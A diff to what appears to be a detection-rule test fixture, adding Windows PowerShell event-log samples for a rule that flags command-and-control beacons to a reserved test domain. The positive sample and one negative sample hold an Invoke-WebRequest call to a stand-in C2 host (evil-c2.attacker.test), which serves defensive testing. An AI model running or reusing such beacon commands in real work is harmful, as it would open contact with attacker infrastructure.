@@ -84,9 +84,23 @@ FIXTURE = [
     ("exec_neg_nonexe", "amcache",  # in Public but not an executable extension
      {"FullPath": r"c:\users\public\notes.txt", "Name": "notes.txt",
       "FileExtension": ".txt", "IsOsComponent": "False"}),
+    # --- evtx PowerShell: C2 attempt to a reserved/sinkhole TLD ---
+    ("psc2_pos", "evtx",
+     {"Channel": "Microsoft-Windows-PowerShell/Operational", "EventId": "4104",
+      "ScriptBlockText": "Invoke-WebRequest -Uri http://evil-c2.attacker.test/beacon -UseBasicParsing"}),
+    ("psc2_neg_nocmdlet", "evtx",  # PowerShell + reserved TLD but no network cmdlet
+     {"Channel": "Microsoft-Windows-PowerShell/Operational", "EventId": "4104",
+      "ScriptBlockText": "Write-Host 'connecting to api.attacker.test'"}),
+    ("psc2_neg_legitdomain", "evtx",  # network cmdlet but to a real domain (not reserved TLD)
+     {"Channel": "Microsoft-Windows-PowerShell/Operational", "EventId": "4104",
+      "ScriptBlockText": "Invoke-WebRequest -Uri https://github.com/foo -OutFile bar"}),
+    ("psc2_neg_notps", "evtx",  # cmdlet + reserved TLD but not the PowerShell channel
+     {"Channel": "Security", "EventId": "4688",
+      "ScriptBlockText": "Invoke-WebRequest http://evil-c2.attacker.test/x"}),
 ]
 
 EXPECTED = {
+    "tlvb-powershell-c2-reserved-tld": {"psc2_pos"},
     "tlvb-exec-from-world-writable-path": {"exec_pos_public"},
     "tlvb-ransomware-locked-mass-rename": {"locked_pos_rename", "locked_pos_note"},
     "tlvb-lnk-double-extension-masquerade": {"lnk_pos"},
